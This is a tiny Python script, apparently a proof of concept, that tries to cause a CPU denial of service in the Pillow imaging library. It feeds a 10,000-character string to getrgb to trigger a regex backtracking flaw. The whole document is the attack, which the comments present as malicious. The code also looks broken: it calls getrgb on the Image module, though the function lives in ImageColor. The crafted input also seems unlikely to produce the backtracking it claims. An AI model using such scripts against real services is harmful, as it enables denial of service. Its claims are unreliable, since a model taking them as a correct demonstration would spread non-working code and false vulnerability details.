# Import the Pillow library
from PIL import Image

# Define a malicious color string
# This string has 10000 repetitions of 'a'
# It can trigger the ReDoS in the getrgb function
color = "a" * 10000

# Try to convert the color string to RGB using the Pillow library
# This will cause a CPU denial of service due to the vulnerability
Image.getrgb(color)